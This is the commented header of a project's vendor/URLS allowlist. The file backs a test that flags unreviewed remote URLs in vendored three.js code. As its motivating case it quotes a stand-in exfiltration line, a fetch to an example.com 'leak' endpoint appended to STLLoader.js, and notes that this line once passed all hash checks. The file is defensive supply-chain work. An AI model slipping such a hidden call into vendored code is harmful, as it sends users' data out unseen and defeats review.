# vendor/URLS -- every remote URL in vendor/*.js, each one reviewed.
#
# Why this exists: vendor/SHA256SUMS pins vendor/ against *accidental* edits,
# but a deliberate upgrade refreshes it by design -- so on exactly the commit
# that brings in new third-party code, the hash check stops protecting anything.
# Codex review round 6 on PR #1 showed it: fetch("https://example.com/leak")
# appended to STLLoader.js, with SHA256SUMS refreshed, passed all 15 checks.
#
# A hash diff is opaque; this list is not. tests/check_invariants.py fails on any
# remote URL in vendor/ that is not listed here, naming it. So an upgrade that
# adds a network endpoint cannot land quietly: someone has to add that URL below,
# in a diff a reviewer can read, and decide what it is.
#
# DO NOT regenerate this file wholesale on an upgrade. Add only the new URLs the
# check names, after reading the code around each one. A URL that is a
# documentation link or an XML namespace is inert; one that code can pass to a
# fetch, XMLHttpRequest, Image, script or stylesheet is a network dependency and
# breaks the air-gap README promises.
#
# Format: one URL per line, exactly as the check extracts it (a trailing "." or a
# missing ")" is the extractor's, kept so the match is exact). Lines starting
# with "#" are comments. Reviewed 2026-09-23 against three.js r13x as vendored.


